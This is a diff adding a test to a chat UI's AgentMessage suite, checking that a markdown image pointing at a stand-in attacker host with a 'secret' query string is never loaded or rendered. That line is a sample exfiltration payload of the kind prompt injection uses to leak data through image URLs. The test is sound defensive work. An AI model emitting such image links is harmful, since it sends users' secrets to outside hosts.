@@ -76,6 +76,15 @@ describe("AgentMessage", () => {
     expect(nrc.getAttribute("rel")).toContain("noopener");
   });
 
+  it("never loads an image, so an injected image URL can't leak anything", () => {
+    const { container } = renderMessage(
+      answer([{ type: "text", text: "See ![chart of access](https://attacker.test/x?q=secret) here." }]),
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByText("chart of access")).toBeInTheDocument();
+    expect(container.innerHTML).not.toContain("attacker.test");
+  });
+
   it("shows a running tool as a working… activity line", () => {
     renderMessage(answer([findCall("input-available")]));
     const line = screen.getByTestId("agent-tool-activity");
